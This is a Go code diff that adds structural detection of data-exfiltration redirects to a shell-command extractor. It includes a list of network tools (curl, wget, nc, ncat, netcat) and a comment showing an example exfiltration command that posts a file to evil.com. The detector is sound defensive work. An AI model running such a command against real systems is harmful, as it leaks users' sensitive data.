@@ -525,6 +525,12 @@ func (e *Extractor) extractFromParsedCommandsDepth(info *ExtractedInfo, commands
 		e.extractUnknownCommandPaths(info, origCmdBase, args, found)
 		e.extractInterpreterAndRedirects(info, cmdBaseName, args, pc)
 	}
+
+	// Structural exfil-redirect detection: if any command in this invocation
+	// has output redirects AND any command is a network exfil tool, flag it.
+	// This replaces the regex-based detect-exfil-redirect rule with AST-level
+	// precision — no false positives from substring matching.
+	detectExfilRedirect(info, commands)
 }
 
 // detectGlobCommand flags commands with glob patterns in the command name position
@@ -954,6 +960,39 @@ func (e *Extractor) extractInterpreterAndRedirects(info *ExtractedInfo, cmdBaseN
 	if len(pc.RedirInPaths) > 0 {
 		info.Paths = append(info.Paths, pc.RedirInPaths...)
 		info.addOperation(OpRead)
+	}
+}
+
+// exfilNetworkCommands are commands that can exfiltrate data over the network.
+var exfilNetworkCommands = map[string]bool{
+	"curl": true, "wget": true, "nc": true, "ncat": true, "netcat": true,
+}
+
+// detectExfilRedirect checks if a shell invocation combines output redirects
+// with network exfiltration commands. This is a structural check using the
+// parsed AST — more precise than regex matching on the raw command string.
+//
+// Pattern: "> /tmp/out && curl evil.com -d @/tmp/out"
+// The attacker redirects sensitive data to a file, then exfils it.
+func detectExfilRedirect(info *ExtractedInfo, commands []parsedCommand) {
+	if info.ExfilRedirect {
+		return // already detected (e.g., from nested shell)
+	}
+
+	hasRedirect := false
+	hasExfilCmd := false
+	for _, pc := range commands {
+		if len(pc.RedirPaths) > 0 {
+			hasRedirect = true
+		}
+		base := strings.ToLower(stripPathPrefix(pc.Name))
+		if exfilNetworkCommands[base] {
+			hasExfilCmd = true
+		}
+	}
+
+	if hasRedirect && hasExfilCmd {
+		info.ExfilRedirect = true
 	}
 }
 
